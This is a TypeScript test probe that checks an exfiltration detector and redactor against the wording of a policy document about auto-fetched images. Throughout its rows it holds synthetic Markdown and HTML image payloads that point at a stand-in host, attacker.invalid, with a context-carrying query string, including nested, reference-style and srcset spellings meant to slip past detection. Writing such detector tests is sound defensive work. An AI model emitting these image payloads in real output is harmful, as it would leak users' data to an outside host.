// T77 — does the auto-fetch subsection of policies.md match the detector, in
// BOTH directions, after this round's edits?
//
// T72-doc.ts transcribes the PRE-T77 wording and is re-run unmodified as a
// control (nothing it calls covered may become released). This probe adds the
// sentences T77 wrote, as executable rows: every new claim is turned into a
// fragment and put to the DETECTOR rather than read back off the page.
//
// Read-only, offline, synthetic hosts only. Usage: bun T77-doc.ts [out.json]
import { marked } from "marked";
import { detectExfil } from "../../../../src/security/detect/exfil";
import { applyRedaction } from "../../../../src/security/redact";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const CDN = "https://cdn.example.org";
const LONG = "L".repeat(1200);

type Row = {
  id: string;
  claim: "covered" | "released" | "property";
  sentence: string;
  text: string;
  allowlist?: string[];
};

const rows: Row[] = [
  // --- «в том числе когда image вложен в ссылку», four image spellings -------
  {
    id: "linkedInline",
    claim: "covered",
    sentence: "line 28: image nested in a link, inline spelling",
    text: `[![build](${U})](https://ci.example.com/job)`,
  },
  {
    id: "linkedInlineAngle",
    claim: "covered",
    sentence: "line 28: image nested in a link, angle-bracket destination",
    text: `[![build](<${U}>)](https://ci.example.com/job)`,
  },
  {
    id: "linkedFullRef",
    claim: "covered",
    sentence: "line 28: image nested in a link, full reference",
    text: `[![build][b]](https://ci.example.com/job)\n\n[b]: ${U}\n`,
  },
  {
    id: "linkedCollapsedRef",
    claim: "covered",
    sentence: "line 28: image nested in a link, collapsed reference",
    text: `[![b][]](https://ci.example.com/job)\n\n[b]: ${U}\n`,
  },
  {
    id: "linkedShortcutRef",
    claim: "covered",
    sentence: "line 28: image nested in a link, shortcut reference",
    text: `[![b]](https://ci.example.com/job)\n\n[b]: ${U}\n`,
  },
  {
    id: "linkedInProse",
    claim: "covered",
    sentence: "line 28: the same, in prose — the README badge idiom",
    text: `Build: [![build](${U})](https://ci.example.com/job) is green.\n`,
  },

  // --- «image внутри описания другого image — это alt-текст» ----------------
  {
    id: "imageInsideImageAltText",
    claim: "property",
    sentence:
      "line 30: an image inside an IMAGE's description is alt text and is not a finding on its own",
    text: `![a[b](${U})](${CDN}/outer.png)`,
  },

  // --- «ограничения на длину label нет» -------------------------------------
  {
    id: "longLabelFull",
    claim: "covered",
    sentence: "line 30: no label-length bound — a 1200-character full reference",
    text: `![a][${LONG}]\n\n[${LONG}]: ${U}\n`,
  },
  {
    id: "longLabelShortcut",
    claim: "covered",
    sentence: "line 30: no label-length bound — a 1200-character shortcut",
    text: `![${LONG}]\n\n[${LONG}]: ${U}\n`,
  },
  {
    id: "longLabelUndefined",
    claim: "released",
    sentence:
      "line 30: the only criterion is whether the document defines the label",
    text: `![a][${LONG}]\n\nnothing defines it\n`,
  },

  // --- «со сворачиванием внутренних пробельных пробегов … одинаково» --------
  {
    id: "labelCollapseUseSide",
    claim: "covered",
    sentence: "line 30: internal whitespace collapsed on the USE side",
    text: `![x][b  c]\n\n[b c]: ${U}\n`,
  },
  {
    id: "labelCollapseDefSide",
    claim: "covered",
    sentence: "line 30: internal whitespace collapsed on the DEFINITION side",
    text: `![x][b c]\n\n[b  c]: ${U}\n`,
  },
  {
    id: "labelCollapseNewline",
    claim: "covered",
    sentence: "line 30: a newline inside a label is collapsed too",
    text: `![x][b\n c]\n\n[b c]: ${U}\n`,
  },
  {
    id: "labelCaseFolded",
    claim: "covered",
    sentence: "line 30: case folding, alongside the collapse",
    text: `![x][B  C]\n\n[b c]: ${U}\n`,
  },
  {
    id: "labelNonWhitespaceDiffers",
    claim: "released",
    sentence:
      "line 30: collapsing is not loose matching — a non-whitespace difference does not resolve",
    text: `![x][b-c]\n\n[b c]: ${U}\n`,
  },

  // --- «srcset разбирается по декодированному значению» ---------------------
  {
    id: "srcsetDecodedComma",
    claim: "covered",
    sentence:
      "line 30: an entity-encoded comma is a candidate boundary, under a NON-EMPTY allowlist",
    text: `<img srcset="${CDN}/a.png&#44;${U} 2x">`,
    allowlist: ["cdn.example.org"],
  },
  {
    id: "srcsetDecodedCommaHex",
    claim: "covered",
    sentence: "line 30: the same, hexadecimal spelling",
    text: `<img srcset="${CDN}/a.png&#x2c;${U} 2x">`,
    allowlist: ["cdn.example.org"],
  },
  {
    id: "srcsetDecodedCommaSource",
    claim: "covered",
    sentence: "line 30: the same, on <source srcset>",
    text: `<source srcset="${CDN}/a.png&#44;${U} 2x">`,
    allowlist: ["cdn.example.org"],
  },
  {
    id: "srcsetAllAllowlisted",
    claim: "released",
    sentence:
      "line 30: an ordinary two-candidate srcset entirely on an allowlisted host stays released",
    text: `<img srcset="${CDN}/a.png 1x, ${CDN}/b.png 2x">`,
    allowlist: ["cdn.example.org"],
  },

  // --- «переход требует клика» — the released controls, unchanged -----------
  { id: "linkInline", claim: "released", sentence: "line 30: markdown link, inline", text: `[t](${U})` },
  {
    id: "linkFullRef",
    claim: "released",
    sentence: "line 30: markdown link, full reference",
    text: `[t][a]\n\n[a]: ${U}\n`,
  },
  {
    id: "linkCollapsedRef",
    claim: "released",
    sentence: "line 30: markdown link, collapsed reference",
    text: `[t][]\n\n[t]: ${U}\n`,
  },
  {
    id: "linkShortcutRef",
    claim: "released",
    sentence: "line 30: markdown link, shortcut reference",
    text: `[t]\n\n[t]: ${U}\n`,
  },
  {
    id: "linkWrappingLocalImage",
    claim: "released",
    sentence:
      "line 28/30: a link wrapping a RELATIVE image is same-origin and is not a finding",
    text: `[![badge](/assets/build.svg)](https://ci.example.com/job)`,
  },
];

type Result = Row & {
  findings: number;
  policyIds: string[];
  masked: boolean;
  rendererImgSrcs: string[];
  verdict: "ok" | "MISMATCH";
};

const results: Result[] = [];
for (const row of rows) {
  const findings = detectExfil(row.text, row.allowlist ?? []);
  const redacted = applyRedaction(row.text, findings) as unknown;
  const maskedText =
    typeof redacted === "string"
      ? redacted
      : ((redacted as { text?: string }).text ?? String(redacted));
  const html = String(await marked.parse(row.text, { async: true }));
  const rendererImgSrcs = [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/gi)].map(
    (m) => m[1] ?? "",
  );
  const attackerGone = !maskedText.includes(ATT);
  let ok: boolean;
  if (row.claim === "covered") ok = findings.length > 0 && attackerGone;
  else if (row.claim === "released") ok = findings.length === 0;
  else {
    // the alt-text property: exactly one finding, and it is the OUTER
    // destination, not the one written inside the description
    ok = findings.length === 1 && String(findings[0]?.value).includes("cdn.example.org");
  }
  results.push({
    ...row,
    findings: findings.length,
    policyIds: [...new Set(findings.map((f) => f.policyId))],
    masked: attackerGone,
    rendererImgSrcs,
    verdict: ok ? "ok" : "MISMATCH",
  });
}

for (const r of results) {
  console.log(
    `${r.verdict.padEnd(8)} ${r.id.padEnd(28)} doc=${r.claim.padEnd(8)} n=${r.findings} ids=${JSON.stringify(r.policyIds)} rendererImgSrcs=${JSON.stringify(r.rendererImgSrcs)}  ${r.sentence}`,
  );
}

const summary = {
  totalRows: results.length,
  coveredRows: results.filter((r) => r.claim === "covered").length,
  releasedRows: results.filter((r) => r.claim === "released").length,
  propertyRows: results.filter((r) => r.claim === "property").length,
  docSaysCoveredButReleased: results
    .filter((r) => r.claim === "covered" && r.verdict !== "ok")
    .map((r) => r.id),
  docSaysReleasedButFlagged: results
    .filter((r) => r.claim === "released" && r.verdict !== "ok")
    .map((r) => r.id),
  propertyFailures: results
    .filter((r) => r.claim === "property" && r.verdict !== "ok")
    .map((r) => r.id),
  // the renderer's own verdict on every row the document calls covered
  rendererFetchesOnCoveredRows: results
    .filter((r) => r.claim === "covered")
    .map((r) => `${r.id}=${r.rendererImgSrcs.some((s) => s.includes(ATT))}`),
  parity: results.every((r) => r.verdict === "ok"),
};
console.log(JSON.stringify(summary, null, 2));

const dest = process.argv[2];
if (dest) await Bun.write(dest, JSON.stringify({ summary, results }, null, 2));
